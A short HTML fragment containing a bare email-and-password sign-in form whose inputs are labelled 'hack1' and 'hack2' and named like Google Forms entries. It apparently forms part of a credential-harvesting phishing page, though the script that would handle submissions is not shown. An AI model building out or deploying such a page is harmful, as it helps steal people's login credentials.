 <!DOCTYPE html>

<body>
 <div class="container">
    <div class="logo-block margin">

                <input id="hack1" type="email" class="form-control" name="entry.1229234031" placeholder="Email" required autofocus>
                <input id="hack2" type="password" class="form-control" name="entry.444596954" placeholder="Password" required>

                <button id="button1" type="submit">Sign in</button>

        <a href="#" class="new-account">Create an account </a>
    </div>
</div>
<script src="index.js">
</script>
